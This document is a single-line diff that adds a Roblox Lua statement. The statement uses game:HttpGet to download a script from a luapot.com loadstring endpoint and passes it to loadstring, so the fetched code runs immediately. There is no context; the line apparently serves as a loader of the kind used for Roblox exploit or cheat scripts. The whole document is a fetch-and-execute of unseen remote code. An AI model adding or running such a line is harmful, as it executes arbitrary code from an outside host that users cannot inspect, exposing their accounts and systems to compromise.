@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/c10d70bc4d77d3160ba167b6f7c3d2ff"))()
